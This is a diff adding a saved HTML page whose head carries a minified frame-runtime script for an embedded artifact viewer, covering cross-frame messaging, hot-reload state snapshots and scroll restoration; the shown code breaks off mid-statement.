@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<!-- saved from url=(0092)https://2099c1c7-b3d1-41ef-a726-e1b2590221bf.frame.claudeusercontent.com/_f/1792577239-ad9d/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!-- frame-runtime --><script>window.__FRAME_PREAMBLE={"v":1,"cred":"cookie","capabilities":{"artifact":"artifact.BBvTDtAn.js","assets":"assets.DOAjpBS9.js","comments":"comments.BjISm5Q7.js","db":"db.zFlAA4qL.js","dictation":"dictation.f3j7VXQ8.js","downloads":"downloads.axDW2QAi.js","embed":"embed.SWCZLzn6.js","endpoints":"endpoints.BPfoKaE1.js","files":"files.IkpCjcgM.js","mcp":"mcp.kl0G36TA.js","network":"network.B5UA9Su4.js","paste":"paste.DeKNLIxx.js","permissions":"permissions.6yWoDecA.js","reads":"reads.Bgov9hIw.js","room":"room.BYRHiLCc.js","sample":"sample.D0G8eGrV.js","self":"artifact.BBvTDtAn.js","tts":"tts.iS74i_mi.js","user":"user.uKicftX-.js"},"transforms":"_transforms.CRcnZuGX.js","comments":"_comments.AKhddNYY.js","translate":"_translate.DqxC5ek1.js","ldx":"_ldx.B4FSryPi.js"}                                                                                                                                                                                                                                                                                                                                                                 </script><script>(function(){"use strict";function dr(t){return t==="cookie"||t==="query"?t:void 0}function hr(t){return typeof t=="number"&&Number.isSafeInteger(t)&&t>0?t:void 0}var to=3e5;function pr(t,e){try{const r=t("navigation")[0],n=[r.responseStart,r.redirectEnd-r.redirectStart,r.domContentLoadedEventStart,e(),r.connectEnd-r.domainLookupStart,r.responseStart-r.requestStart];r.requestStart>0||(n.length=4);for(let a=0;a<n.length;a++)if(n[a]>=0&&n[a]<=3e5)n[a]=n[a]|0;else{if(a<4)return;n.length=4}return n}catch{return}}var mr=["light","dark","system"],vr=/^[A-Za-z0-9_-]{1,64}$/,Mt=/^[a-zA-Z_:][a-zA-Z0-9_:.-]{0,127}$/,_r=new Set(["class","hidden","value","checked","style","title","alt","placeholder","lang","dir","role","tabindex","disabled","readonly","contenteditable","open","colspan","rowspan"]);function yr(t){const e=t.toLowerCase();return e.startsWith("data-")||e.startsWith("aria-")||_r.has(e)}var Pt="data-ldx-props";function gr(t,e){if(e.toLowerCase()===Pt)return!0;const r=t.getAttribute(Pt);if(r===null)return!1;try{const n=JSON.parse(r);if(n===null||typeof n!="object"||Array.isArray(n))return!0;const a=e.toLowerCase();return Object.keys(n).some(s=>s.toLowerCase()===a)}catch{return!0}}var ro="http://www.w3.org/1999/xhtml",wr="http://www.w3.org/2000/svg",br=new Set(["script","style","iframe","noscript","noframes","noembed","xmp","plaintext","template","title","textarea","object","embed"]),Er=new Set(["script","style"]);function Sr(t){const e=t.localName.toLowerCase();return t.namespaceURI==="http://www.w3.org/1999/xhtml"?!br.has(e):t.namespaceURI===wr?!Er.has(e):!1}function ot(t,e){return t===e||(t===160||t===32)&&(e===160||e===32)}function kr(t,e){const r=t.length,n=e.length;let a=0;for(;a<r&&a<n&&ot(t.charCodeAt(a),e.charCodeAt(a));)a++;let s=0;for(;s<r-a&&s<n-a&&ot(t.charCodeAt(r-1-s),e.charCodeAt(n-1-s));)s++;return{p:a,s}}function Ar(t,e){const r=t.firstChild;if(t.childNodes.length!==1||r===null||r.nodeType!==Node.TEXT_NODE){t.textContent=e;return}const n=r.data,a=n.length,s=e.length,{p:l,s:u}=kr(n,e);l===a&&u===0&&a===s||r.replaceData(l,a-l-u,e.slice(l,s-u));const R=r.data,b=t.ownerDocument.getSelection?.()??null,y=b!==null&&b.rangeCount>0&&(b.anchorNode===r||b.focusNode===r)?{anchor:b.anchorNode,anchorOffset:b.anchorOffset,focus:b.focusNode,focusOffset:b.focusOffset}:null;let p=-1,k=-1;for(let m=0;m<R.length&&m<e.length;m++){const j=R.charCodeAt(m),A=e.charCodeAt(m);j!==A&&ot(j,A)&&(p<0&&(p=m),k=m)}const L=p>=0;if(L&&r.replaceData(p,k-p+1,e.slice(p,k+1)),L&&y!==null&&y.anchor!==null&&y.focus!==null)try{b.setBaseAndExtent(y.anchor,y.anchorOffset,y.focus,y.focusOffset)}catch{}}var Rr=new Set(["html","head","body","frameset"]);function Tr(t){return t.namespaceURI==="http://www.w3.org/1999/xhtml"&&Rr.has(t.localName)}function Lr(t){if(t===null||typeof t!="object")return!1;const e=t;if(typeof e.target!="string"||!vr.test(e.target)||e.text!==void 0&&typeof e.text!="string")return!1;if(e.attrsSet!==void 0){if(e.attrsSet===null||typeof e.attrsSet!="object")return!1;for(const[r,n]of Object.entries(e.attrsSet))if(!Mt.test(r)||typeof n!="string")return!1}if(e.attrsRemoved!==void 0){if(!Array.isArray(e.attrsRemoved))return!1;for(const r of e.attrsRemoved)if(typeof r!="string"||!Mt.test(r))return!1}return!0}function Or(t,e){if(t===null||typeof t!="object")return!1;const{seq:r,elements:n}=t;if(typeof r!="number"||!Number.isSafeInteger(r)||!Array.isArray(n)||n.length===0||n.length>64)return!1;for(let a=0;a<n.length;a++)if(!e(n[a]))return!1;return!0}function Mr(t){return t===null||typeof t!="object"?!1:Or(t.__frame_patch,Lr)}function Pr(t){if(t===null||typeof t!="object")return!1;const e=t.__frame_init;return e!==null&&typeof e=="object"}function Nr(t){return t!==null&&typeof t=="object"&&t.__frame_size_poke===!0}function Cr(t){if(t===null||typeof t!="object")return!1;const e=t.__frame_host_visible;return e!==null&&typeof e=="object"&&typeof e.visible=="boolean"}function Fr(t){if(t===null||typeof t!="object")return!1;const e=t.__frame_theme;if(e===null||typeof e!="object")return!1;const r=e.theme;return typeof r=="string"&&mr.includes(r)}var xr=["ok","empty","snapshot_error","snapshot_timeout","unclonable","oversize","unavailable","restore_error","withheld"],jr=["TypeError","RangeError","ReferenceError","SyntaxError","DataCloneError","QuotaExceededError","AbortError","TimeoutError","SecurityError","Error","other"];function Ir(t){return typeof t=="string"&&jr.includes(t)?t:"other"}var Dr=Object.freeze({until:null,now:!1}),Hr="__claude_hot",Br="__claude_hot_in",qr=/^__claude_hot(?:_in)?(?::|$)/,Nt=/^[0-9a-z]{1,32}$/,at=t=>t===void 0?Hr:"__claude_hot:"+t,Oe=t=>t===void 0?Br:"__claude_hot_in:"+t;function Ur(t,e){const r=[];for(let n=0;n<t.length;n++){const a=t.key(n);a!==null&&a!==e&&qr.test(a)&&r.push(a)}for(const n of r)t.removeItem(n)}function Kr(t){let e=null;try{e=U(JSON.parse(t)?.hot)}catch{return null}return e===null||typeof e.k!="string"||!Nt.test(e.k)?null:he(e.g)?{k:e.k,g:e.g}:{k:e.k}}var no=262144,Gr=3e3,$r=5e3,Ct=/^[a-z0-9._:-]{1,64}$/,zr=["none","hot-restart","hard-reload"],Wr=["asset","doc","added","removed"],Vr=1500,Xr=/^[0-9a-f]{64}$/;function U(t){return t!==null&&typeof t=="object"?t:null}function he(t){return typeof t=="number"&&Number.isInteger(t)&&t>=0&&t<2**31}function Ft(t){return t===void 0||typeof t=="number"&&Number.isFinite(t)}function Yr(t){return t===void 0||typeof t=="string"&&Ct.test(t)}function xt(t){const e=U(t);return e!==null&&(e.until===null||typeof e.until=="number"&&Number.isFinite(e.until))&&typeof e.now=="boolean"}function st(t){const e=U(t);return e!==null&&typeof e.ver=="string"&&e.ver.length<=128&&Ft(e.seq)&&typeof e.handoff=="string"&&xr.includes(e.handoff)&&Yr(e.note)}function jt(t){const e=U(t);return e!==null&&he(e.gen)&&(e.phase==="final"||e.phase==="pending")&&(e.from===null||st(e.from))}function Jr(t){const e=U(t);return e!==null&&e.kv===1&&he(e.gen)&&st(e.from)&&Object.hasOwn(e,"data")}function Zr(t){const e=U(t);return e!==null&&e.__frame_hot_snapshot===!0&&he(e.gen)&&typeof e.timeoutMs=="number"&&e.timeoutMs>=0&&e.timeoutMs<=6e4&&(e.handoff===void 0||typeof e.handoff=="boolean")&&(e.deadline===void 0||xt(e.deadline))&&Ft(e.seq)&&(e.note===void 0||typeof e.note=="string")&&(e.key===void 0||typeof e.key=="string")}function Qr(t){const e=U(t);return e!==null&&e.__frame_hot_start===!0&&he(e.gen)&&st(e.from)}function en(t){return typeof t=="string"&&t.length>=1&&t.length<=128}function It(t){return U(t)!==null&&!Array.isArray(t)}function tn(t){const e=U(t);return e!==null&&e.__frame_cap_grant===!0&&typeof e.cap=="string"&&en(e.ver)&&(e.grant===void 0||It(e.grant))&&(e.budgets===void 0||It(e.budgets)&&Object.values(e.budgets).every(Number.isFinite))&&(e.brokerGen===void 0||he(e.brokerGen))}function rn(t){const e=U(t);return e!==null&&e.__frame_cap_rewired===!0&&(e.caps===void 0||Array.isArray(e.caps)&&e.caps.every(r=>typeof r=="string"))&&(e.brokerGen===void 0||he(e.brokerGen))}function Ge(t){const e=U(t);return e!==null&&typeof e.ver=="string"&&e.ver.length<=128&&Number.isFinite(e.seq)}function Dt(t){if(t==null||typeof t=="string")return!0;const e=U(t);return e!==null&&typeof e.doc=="string"&&typeof e.profile=="string"}function nn(t){const e=U(t);return e!==null&&typeof e.path=="string"&&Wr.includes(e.kind)&&Dt(e.from)&&Dt(e.to)}function on(t){return t===null?null:Object.freeze(t.filter(nn))}function an(t){const e=U(t);return e!==null&&e.__frame_hot_update===!0&&Number.isFinite(e.id)&&Ge(e.from)&&Ge(e.to)&&(e.changed===null||Array.isArray(e.changed))&&zr.includes(e.required)&&xt(e.deadline)&&typeof e.verdictTimeoutMs=="number"&&e.verdictTimeoutMs>=0&&e.verdictTimeoutMs<=6e4&&(e.preflight===void 0||typeof e.preflight=="string"&&Xr.test(e.preflight))}function sn(t){const e=U(t);return e!==null&&e.__frame_hot_readdress===!0&&Ge(e.from)&&Ge(e.to)}var pe=/^[\w.-]+\.js$/;function ln(t,e,r){return r?"inert":typeof e=="string"&&pe.test(e)?t?[e]:"inert":t?"inert":"framed"}var Ht=Object.freeze({[Symbol("claude.hot.restart")]:!0});function Bt(t,e){let r;try{r=t??sessionStorage}catch{return null}const n=at(e?.k),a=Oe(e?.k);let s=null;try{s=r.getItem(n)}catch{}try{r.removeItem(n)}catch{}try{Ur(r,a)}catch{}let l=null;if(s!==null&&!(e!==null&&e.g===void 0))try{const u=JSON.parse(s);Jr(u)&&(e===null||u.gen===e.g)&&(l=u)}catch{}if(l===null)try{r.removeItem(a)}catch{}return l}function qt(){const t=/^\/_f\/([^/]{1,128})\//.exec(location.pathname);return t?t[1]:""}var cn=/^[^/\\?#]{1,128}$/,it=t=>cn.test(t)&&t!=="."&&t!=="..";function Ut(t,e,r){const n=new URL(t),a="/_f/"+e+"/";if(!e||!n.pathname.startsWith(a)||!it(r))return null;const s=n.search.slice(1).split("&").filter(l=>!/^__frame_t(?:=|$)/.test(l)).join("&");return n.origin+"/_f/"+r+"/"+n.pathname.slice(a.length)+(s?"?"+s:"")+n.hash}var $e="{}";function Me(t){if(!t)return null;const e={ver:t.ver,handoff:t.handoff};return t.seq!==void 0&&(e.seq=t.seq),t.note!==void 0&&(e.note=t.note),e}function Kt(t,e){return t!==null&&t.note===void 0&&e?.note!==void 0?{...t,note:e.note}:t}function Gt(t){const e=t?.k;return e!==null&&typeof e=="object"?e:void 0}function un(t,e,r,n=null){const a=setTimeout,s=clearTimeout,l=queueMicrotask,u=performance.now.bind(performance),R=new TextEncoder;let b=null,y=null;try{b=history,y=b.replaceState.bind(b)}catch{}const p=(...o)=>{try{console.warn(...o)}catch{}};let k=qt(),L=null;try{L=sessionStorage}catch{}const m={storage:L,fetch:typeof fetch=="function"?fetch.bind(globalThis):null,entry:location.origin+location.pathname+location.search,ver:k,priors:[],key:n?.k};let j=n?.k;const A=typeof requestAnimationFrame=="function"?requestAnimationFrame:o=>a(()=>o(u()),16);let _=e?.data??{},E=Me(e?.from),I=e?.gen??0,D=e!==null,q=!1,$=!1,H=null,xe=!1;const be=new AbortController;let je=null,K=null,Ee=null,Ie=!1,le=()=>{};const te=new Promise(o=>{le=o});let ve=!1,Je=!1,Se=!1,c,h=null,g=!1,C=!1,O=!1,z=!1,B=!1,J=!1;const ce=o=>{for(const f of[at(o),Oe(o)])try{L?.removeItem(f)}catch{}},G=(o,f)=>{try{f!==null&&r.post(o,f)}catch{}},_e=()=>B||=O&&(K===null||z),Q=()=>{const o={__frame_hot:!0,ready:K!==null,accept:Ee!==null,demand:!0};J=!B,J&&(o.booting=!0),ve&&(o.readData=!0),Se&&(o.threw=!0),h?.assess&&(o.preflight=!0),G(o,H)};let De=!1,He=!1,ue=!1,re=!1;const Be=()=>{De||!xe||ue||(De=!0,G({__frame_reveal_hold:!0},"*"))},ke=()=>new Promise(o=>{let f,d=0;const v=P=>{if(f===void 0)f=P;else if(P!==f||++d>=8){o();return}try{A(v)}catch{o()}};try{A(v)}catch{o()}}),Ze=()=>{ue=!0,G({__frame_reveal_ready:!0},"*")},ye=o=>{He||(He=!0,o.then(f=>{if(f===!1)return;let d=null;try{d=h?.settle?.()??null}catch{}return(d===null?ke():new Promise(v=>{a(v,50),Promise.resolve(d).then(v,v)}).then(ke)).then(Ze)}))},Qe=()=>{if(re||!ue)return;re=!0;const o=()=>{try{h?.afterReveal?.()}catch{}};o(),ke().then(()=>{o(),Ze()})},ge=(o=!1)=>{if(Ie||K===null||!D||!$)return;Ie=!0;const f=K,d=_;l(()=>{let v;try{v=f(d)}catch(N){throw le(!1),N}let P=!1;try{P=typeof v?.then=="function"}catch{}if(!P){le(!0);return}Promise.resolve(v).then(()=>le(!0),N=>{le(!1),l(()=>{throw N})})}),ye(o?te:r.dcl.then(()=>te))},Ae=o=>typeof o=="string"&&Ct.test(o)?o:void 0,qe=o=>{const f={__frame_hot_restart:!0},d=Ae(o?.note);d!==void 0&&(f.note=d),o?.required==="hard-reload"&&(f.required="hard-reload"),G(f,H)},fe=Object.freeze({get data(){return $||(Je=!0),!D&&!ve&&(ve=!0,$&&Q()),_},get from(){return E},get gen(){return I},signal:be.signal,snapshot(o){typeof o=="function"&&(je=o)},ready(o){typeof o!="function"||K!==null||(K=o,Be(),Q(),q&&G({__frame_hot_ready:!0,gen:I},H),ge())},accept(o){typeof o=="function"&&(Ee=o,Q())},restart(o){const f={note:o?.note,required:o?.required};if($){qe(f);return}const d=c;c={note:Ae(d?.note)??f.note,required:d?.required==="hard-reload"||f.required==="hard-reload"?"hard-reload":void 0}}});let de=null,Ue=()=>{};const et=new Promise(o=>{Ue=o});let i=null;const S=()=>i??=r.dcl.then(()=>{let o=!1;try{o=de!==null&&de.expect()}catch{}if(!o)return;const f=de.maxMs;return new Promise(d=>{et.then(d),a(d,f)})}),w=()=>{if(!g||C||h===null)return;C=!0;const o=h;S().then(()=>{try{ue||o.afterStart(Gt(e),!1)}catch{}})},M=o=>{e!==null&&Je&&(ve=!0),_={},E=null,I=0;try{L?.removeItem(Oe(n?.k))}catch{}e!==null&&!o&&ye(r.dcl.then(()=>K!==null?te:void 0))},ee=()=>{g=!0,ye(S().then(()=>K!==null?te:void 0)),w()};try{addEventListener("error",()=>{Se||K!==null||(Se=!0,Q())})}catch{}const Z=()=>{a(()=>{!B&&_e()&&J&&Q()},0)};try{O=document.readyState==="complete",O||addEventListener("load",()=>{O=!0,Z()},{once:!0})}catch{O=!0}_e(),te.then(()=>{z=!0,Z()});let W=-1,Et,St,Ke=!0,kt=!1,At,tt=null;const Rt=o=>{const f=tt===null;tt=Ke&&o[0]!=="withheld"?o:["withheld",o[1],$e];let d=o[0];if(Ke&&d!=="withheld"){const P={ver:k,handoff:d};Et!==void 0&&(P.seq=Et),St!==void 0&&(P.note=St);try{if(L===null)throw new Error("no storage");L.setItem(at(j),'{"kv":1,"gen":'+W+',"from":'+JSON.stringify(P)+(At!==void 0?',"k":'+JSON.stringify(At):"")+',"data":'+(d==="ok"?o[2]:$e)+"}")}catch{d="unavailable"}}else{d="withheld",ce(j);try{h?.release?.()}catch{}}const v={__frame_hot_snapshotted:!0,gen:W,handoff:d,bytes:o[1]};o[3]!==void 0&&(v.errName=o[3]),G(v,H),f&&(d==="snapshot_error"||d==="unclonable"||d==="oversize")&&p("claude.hot: snapshot",d,o[3])},Re=o=>{try{return Ir(o?.name)}catch{return"other"}},Te=(o,f,d=0)=>Rt(f===void 0?[o,d,$e]:[o,d,$e,Re(f)]),zn=o=>{if(o.gen<=W)return;const f=W>=0;if(W=o.gen,Et=o.seq,St=Ae(o.note),typeof o.key=="string"&&Nt.test(o.key)&&o.key!==j&&(ce(j),j=o.key),Ke&&=o.handoff!==!1,f){tt!==null?Rt(tt):kt&&G({__frame_hot_held:!0,gen:W},H);return}be.abort();const d=Object.freeze({handoff:Ke,timeoutMs:o.timeoutMs,deadline:o.deadline??Dr}),v=je,P=()=>{if(Ke)try{At=h?.capture()}catch{}if(v===null){Te("empty");return}let T=!1;const V=a(()=>{T||(T=!0,Te("snapshot_timeout"))},Math.max(0,d.timeoutMs));Promise.resolve().then(()=>v(d)).then(Le=>{if(T)return;T=!0,s(V);let ne;try{ne=JSON.stringify(Le)}catch(Tt){Te("unclonable",Tt);return}if(typeof ne!="string"){Te("unclonable");return}let oe=ne.length;try{oe=R.encode(ne).length}catch{}if(oe>262144){Te("oversize",void 0,oe);return}Rt(["ok",oe,ne])},Le=>{T||(T=!0,s(V),Te("snapshot_error",Le))})};let N=null;try{N=h?.holdForIme()??null}catch{}if(N===null)P();else{kt=!0,G({__frame_hot_held:!0,gen:W},H);const T=()=>{kt=!1,P()};N.then(T,T)}},Wn=o=>{if(!q||D||K===null||o.gen!==I)return;let f=null;try{f=Bt(L,n&&{k:n.k,g:o.gen})}catch{}if(f!==null&&f.gen!==o.gen){f=null;try{L?.removeItem(Oe(n?.k))}catch{}}_=f?.data??{},E=Kt(Me(f?.from??o.from),Me(o.from)),f!==null&&(I=f.gen),D=!0,q=!1;const d=Gt(f);te.then(v=>{try{v&&h?.afterStart(d,!0)}catch{}}),ge(!0)},lr=o=>{const f=k,d=m.entry;let v="",P,N=null;try{if(v=location.href,P=b.state,N=Ut(v,f,o),N!==null)if(y(P,"",N),location.pathname.startsWith("/_f/"+o+"/"))N=location.href;else return{failed:"navigate event canceled"}}catch(T){return{failed:Re(T)}}k=m.ver=o,m.priors.push(f)>8&&m.priors.splice(1,1);try{m.entry=Ut(d,f,o)??d}catch{}return[N,f,d,v,P]},Vn=({from:o,to:f})=>{let d,v;if(!it(f.ver))d="adopt_failed",v="not a version path segment";else if(f.ver===k)d="adopted";else if(!k||o.ver!==k)d="stale";else{const N=lr(f.ver);"failed"in N?(d="adopt_failed",v=N.failed):d=N[0]===null?"adopt_skipped":"adopted"}v!==void 0&&p(`claude.hot: could not move this page's URL to its new version folder /_f/${f.ver}/ (${v})`);const P={__frame_hot_readdressed:!0,to:f.ver,at:k,outcome:d};G(P,H)};let rt=0;const Xn=o=>{const f=Ee;if(f===null||o.id<=rt)return;rt=o.id;const d=h?.assess;if(o.preflight===void 0||d===void 0){cr(o,f);return}let v=!1;const P=V=>{v||(v=!0,s(T),o.id===rt&&cr(o,f,V))},N=()=>P(d.timeout(o)),T=a(N,Vr+100);d.run(o,window).then(P,N)},cr=(o,f,d)=>{let v,P=!1,N=!1,T,V,Le=null;const ne=F=>{if(N)return!1;if(T!==void 0&&T!==F)return p(`claude.hot: u.${F}() ignored - u.${T}() was called first`),!1;const ae=T===void 0;return T=F,ae},oe=F=>{T="restart",p(`claude.hot: ${F} - restarting`)},Tt=()=>{if(!ne("adopt")||o.id!==rt)return;const F=o.to.ver;if(nt.required!=="none"){oe(`u.adopt() needs required 'none', it is '${nt.required}'`);return}if(!it(F)){oe("u.adopt() cannot address this version");return}if(!k||F===k)return;const ae=lr(F);if("failed"in ae){V="adopt_failed",oe(`adopt_failed ${ae.failed}; URL not changed`);return}const[Y,Ot,Zn,fr,Qn]=ae;Y===null?(V="adopt_skipped",p(`claude.hot: adopt_skipped - page already left /_f/${Ot}/; URL not changed, update still applied`)):V="adopted",Le=()=>{if(k===F){if(Y!==null)try{if(location.href!==Y)p("claude.hot: adopt_revert_skipped - update not applied; URL left where the page navigated");else{if(y(Qn,"",fr),location.href!==fr){p("claude.hot: adopt_revert_failed navigate event canceled - URL still at the new version");return}V="adopt_reverted",p("claude.hot: adopt_reverted - adopt() was called but the handler threw; URL restored")}}catch(eo){p(`claude.hot: adopt_revert_failed ${Re(eo)} - URL still at the new version`);return}k=m.ver=Ot,m.entry=Zn,m.priors[m.priors.length-1]===Ot&&m.priors.pop(),Y===null&&(V=void 0)}}},nt=Object.freeze({from:{ver:o.from.ver,seq:o.from.seq},to:{ver:o.to.ver,seq:o.to.seq},changed:on(o.changed),required:o.required,deadline:o.deadline,adopt:Tt,defer(){return ne("defer")&&nt.deadline.now&&oe("u.defer() past the deadline"),Ht},restart(F){return ne("restart"),T==="restart"&&!N&&(v??=Ae(F?.note),P||=F?.required==="hard-reload"),Ht},...d?.update}),Yn=(F,ae)=>{N=!0,F==="threw"?(Le?.(),v??=Re(ae).toLowerCase()):T===void 0&&p(F==="timeout"?"claude.hot: accept handler did not answer in time - restarting":"claude.hot: accept handler settled without defer/restart/adopt - restarting");const Y={__frame_hot_verdict:!0,id:o.id};Y.verdict=F==="threw"||T===void 0||T==="restart"?"restart":T==="adopt"?"applied":"deferred",Y.verdict==="restart"&&(P&&(Y.required="hard-reload"),v!==void 0&&(Y.note=v)),V!==void 0&&(Y.verdict==="applied"||V!=="adopted")&&(Y.adopt=V),G(Object.assign(Y,d?.verdict),H)};let ur=!1;const Lt=(F,ae)=>ur?!1:(ur=!0,s(Jn),Yn(F,ae),!0),Jn=a(()=>Lt("timeout"),o.verdictTimeoutMs);Promise.resolve().then(()=>f(nt)).then(()=>Lt("settled"),F=>{!Lt("threw",F)&&T==="adopt"&&qe({note:Re(F).toLowerCase()}),p("claude.hot: accept",Re(F))})};try{t.hot===void 0&&Object.defineProperty(t,"hot",{value:fe,writable:!1,configurable:!1,enumerable:!1})}catch{}return{hot:fe,boot:m,afterConnect(){xe=!0,(e!==null||K!==null)&&Be()},onInit(o,f){H=f,$=!0;const d=jt(o)?o:null;d?.phase==="final"&&e!==null&&e.gen===d.gen?(D=!0,E=Kt(E,Me(d.from)),ee()):(q=d?.phase==="pending",M(q),D=!q,I=d?.gen??0,E=Me(d?.from)),Q(),J&&a(()=>{B||(B=!0,Q())},$r),q&&K!==null&&G({__frame_hot_ready:!0,gen:I},f),c!==void 0&&(qe(c),c=void 0),ge()},onNoInit(){$=!0,M(!1),D=!0,ge()},onShell(o){return o?.__frame_revealed===!0?(Qe(),!1):Zr(o)?(zn(o),!0):Qr(o)?(Wn(o),!0):an(o)?(Xn(o),!0):sn(o)?(Vn(o),!0):!1},attachExtras(o){h=o,w(),o.assess&&Q()},inSlot:()=>Oe(j),hydration(o,f){de??={expect:o,maxMs:f}},hydrated(){Ue()},carried(){return D?_:{}},presented:()=>ue}}var oo="frame_ldx_runtime",fn="frame_ldx_build",ao="script#an-form",dn=256;function lt(t,e,r){for(const n of t)r(n)&&t.delete(n);t.size>=dn&&!t.has(e)&&t.delete(t.values().next().value),t.add(e)}function Pe(t,e,r,n){try{const a=t[e];if(typeof a!="function")return;t[e]=function(...s){if(n){let u;try{u=n(this)}catch{}if(u!==void 0)return u}const l=a.apply(this,s);try{r?.(this)}catch{}return l}}catch{}}var hn=()=>{},ct;function pn(){if(ct)return ct;const t={media:new Set,contexts:new Set,wakeLocks:new Set,gate:null,refuse:null,onStart:null,onStop:null};ct=t;const e=l=>t.gate?.(l),r=l=>{t.onStop?.(l)},n=window.HTMLMediaElement?.prototype;n&&(Pe(n,"play",l=>{lt(t.media,l,u=>u.paused),t.onStart?.(l)},e),Pe(n,"pause",r));const a=window.AudioContext,s=window.AudioNode?.prototype;a&&s&&(Pe(s,"connect",l=>{const u=l.context;u instanceof a&&(lt(t.contexts,u,R=>R.state==="closed"),t.onStart?.(u))}),Pe(a.prototype,"resume",void 0,e),Pe(a.prototype,"suspend",r));try{const l=window.WakeLock?.prototype,u=l?.request;l&&typeof u=="function"&&(l.request=function(...R){if(t.refuse)return t.refuse();const b=u.apply(this,R);return Promise.resolve(b).then(y=>{lt(t.wakeLocks,y,p=>p.released),t.onStart?.(y)},hn),b})}catch{}return t}function mn(t){let e=window;for(let r=0;e.parent&&e.parent!==e&&r<8;r++)if(e=e.parent,t(e))return!0;return!1}function vn(){let t=null;const e=()=>t??parent,r=n=>t?n===t:mn(a=>a===n);return{post(n,a){if(t){e().postMessage(n,a);return}let s=parent;for(let l=0;l<8&&(s.postMessage(n,a),!(!s.parent||s.parent===s));l++)s=s.parent},on(n){const a=s=>{const l=s.source;r(l)&&n(s.data,s.origin,s.isTrusted,()=>{t??=l})};return addEventListener("message",a),()=>removeEventListener("message",a)},port:n=>({post(a,s){if(s?.activation){e().postMessage(a,{targetOrigin:n,includeUserActivation:!0});return}if(s?.transfer){e().postMessage(a,n,s.transfer);return}e().postMessage(a,n)},on(a,s){const l=u=>{r(u.source)&&u.origin===n&&a(u.data,u)};return addEventListener("message",l,s),()=>removeEventListener("message",l,s)}})}}function _n(){const t={post:()=>{},on:()=>()=>{}};return{...t,port:()=>t}}var yn=500,gn=2e4,wn="data-token-reads",bn="data-frame-refused-watch",En="data-frame-unsupported",Sn=/(?:^|\s)stylesheet(?:\s|$)/i;function kn(t,e){let r="";if(t instanceof HTMLScriptElement?r=t.src:t instanceof HTMLLinkElement&&Sn.test(t.rel)&&(r=t.href),!r)return null;try{const n=new URL(r);return n.origin===location.origin&&n.pathname.startsWith(e)?n.origin+n.pathname:null}catch{return null}}function An(t,e,r){if(!t||e!=="query")return;const n="/_f/"+t+"/";document.documentElement.setAttribute(bn,"");const a=location.href,s=fetch,l=setTimeout,u={method:"HEAD",cache:"no-store",credentials:"same-origin"},R=m=>m.ok||m.status===304;let b=!1,y=!1;const p=()=>removeEventListener("error",L,!0),k=async m=>{const j=await s(m,u);if(R(j))y=!0;else if(j.status===403){const A=await s(a,u);if(R(A)){const _=(await s(m,u)).status;_===403?(y=!0,document.documentElement.setAttribute(En,""),r()):_<500&&(y=!0)}else A.status>=400&&A.status<500&&(y=!0)}},L=m=>{if(y||b)return;if(document.documentElement.hasAttribute(wn)){y=!0,p();return}const j=kn(m.target,n);j&&(b=!0,l(()=>{k(j).catch(()=>{}).finally(()=>{b=!1,y&&p()})},yn))};addEventListener("error",L,!0),addEventListener("load",p,{once:!0}),l(p,gn)}var ut="__frame_scroll",Rn=150,Tn=310,Ln=160,On=3e4,$t="p,h1,h2,h3,h4,h5,h6,li,pre,blockquote,tr,dt,dd,figcaption,summary",zt=()=>innerWidth<=Tn&&innerHeight<=Ln,Wt=t=>{const e=document.createTreeWalker(t,NodeFilter.SHOW_TEXT);let r="";for(;r.length<600&&e.nextNode();)r+=e.currentNode.nodeValue.slice(0,600-r.length);const n=r.replace(/\s+/g," ").trim().slice(0,120);let a=2166136261;for(let s=0;s<n.length;s++)a=Math.imul(a^n.charCodeAt(s),16777619);return n.length>11?a>>>0||1:0},Vt=t=>{for(let e=t;e&&e!==document.scrollingElement;e=e.parentElement){const r=getComputedStyle(e).position;if(r==="fixed"||r==="sticky"||e!==t&&e.scrollTop)return!1}return!0},Mn=()=>{const t=[],e=[];try{for(let r=0;r<16;r++){const n=document.elementFromPoint(innerWidth/(r%2?4:2),innerHeight*(r>>1)/8+1);let a=n?.closest($t)??n;for(;a&&!a.matches($t)&&![...a.childNodes].some(l=>l.nodeType===3&&l.nodeValue?.trim());)a=a.parentElement;const s=a&&!e.includes(a)?Wt(a):0;s&&!t.some(l=>l[0]===s&&l[2]===a.tagName)&&Vt(a)&&(e.push(a),t.push([s,Math.round(a.getBoundingClientRect().top),a.tagName]))}}catch{}return t.sort((r,n)=>+(r[1]<0)-+(n[1]<0)),t.length?t.slice(0,3):void 0},Pn=t=>{try{for(const[e,r,n]of t.a??[]){const a=document.getElementsByTagName(n);let s;for(let u=0;u<a.length&&a.length<5e3;u++)Wt(a[u])===e&&(s=s===void 0||s?.contains(a[u])?a[u]:null);const l=s?.getBoundingClientRect();if(l?.height&&s.checkVisibility?.()!==!1&&Vt(s)&&isFinite(r))return Math.max(0,Math.round(scrollY+l.top-r))}}catch{}return t.y};function Nn(){let t=0,e=!1,r=!1,n=!1,a={y:0},s=null;const l=E=>{try{sessionStorage.setItem(ut,JSON.stringify(E))}catch{}},u=E=>{if(clearTimeout(t),s===null)return;const I=s;s=null,l({y:I,a:E&&I>0?Mn():void 0})},R=()=>{if(e){e=!1;return}r=!0,s=scrollY,clearTimeout(t),t=setTimeout(u,Rn,!0)};try{addEventListener("scroll",R,{passive:!0}),addEventListener("pagehide",()=>u())}catch{}const b=()=>{let E;try{E=sessionStorage.getItem(ut)}catch{return null}if(E===null)return null;let I;try{I=JSON.parse(E)}catch{I=null}const{y:D,a:q}=I??{};if(!(typeof D=="number"&&Number.isFinite(D)&&D>=0)){try{sessionStorage.removeItem(ut)}catch{}return null}const $=H=>Array.isArray(H)&&typeof H[0]=="number"&&Number.isFinite(H[1])&&typeof H[2]=="string";return{y:D,a:Array.isArray(q)&&q.length<4&&q.every($)?q:void 0}};let y=!1,p=-1;const k=E=>{try{const I=scrollY,D=Pn(E);scrollTo({top:D,left:0,behavior:"instant"}),a=zt()?E:{y:D,a:E.a},n=!0,clearTimeout(t),s=null,l(a),p=scrollY,p!==I&&(e=!0);const q=D!==E.y&&document.readyState!=="complete";(p!==D||q)&&!y&&(y=!0,addEventListener("load",()=>{try{scrollY===p&&k(b()??a)}catch{}},{once:!0}))}catch{}},L=()=>{try{return!!location.hash}catch{return!0}};let m=!1;const j=()=>{try{if(m||!zt())return;m=!0;const E=Date.now(),I=()=>{try{removeEventListener("resize",I)}catch{}Date.now()-E>On||r||L()||k(b()??a)};addEventListener("resize",I)}catch{}};let 